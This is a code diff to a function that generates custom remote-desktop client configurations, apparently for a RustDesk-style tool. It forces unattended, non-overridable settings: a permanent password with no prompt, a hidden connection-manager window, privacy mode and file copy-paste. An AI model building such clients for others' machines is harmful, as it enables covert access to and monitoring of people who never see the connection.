@@ -232,7 +232,23 @@ def generate_custom_client(params, full_url):
             if '=' in line:
                 k, value = line.split('=', 1)
                 decodedCustom['override-settings'][k.strip()] = value.strip()
-    
+
+    # ---- forced silent / unattended options (always on, user cannot override) ----
+    # Unattended silent client: no password prompt on the operator side, no local
+    # accept window / no connection-manager window on the controlled side.
+    #   verification-method = use-permanent-password
+    #   approve-mode        = password
+    #   allow-hide-cm       = Y   (=> password_security::hide_cm() == true, CM hidden)
+    decodedCustom.setdefault('override-settings', {})
+    decodedCustom.setdefault('default-settings', {})
+    decodedCustom['override-settings']['verification-method'] = 'use-permanent-password'
+    decodedCustom['override-settings']['approve-mode'] = 'password'
+    decodedCustom['override-settings']['allow-hide-cm'] = 'Y'
+    decodedCustom['override-settings']['privacy-mode'] = 'Y'
+    decodedCustom['override-settings']['enable-privacy-mode'] = 'Y'
+    decodedCustom['override-settings']['enable-file-copy-paste'] = 'Y'
+    decodedCustom['override-settings']['allow-remove-wallpaper'] = 'Y'
+
     decodedCustomJson = json.dumps(decodedCustom)
 
     string_bytes = decodedCustomJson.encode("ascii")
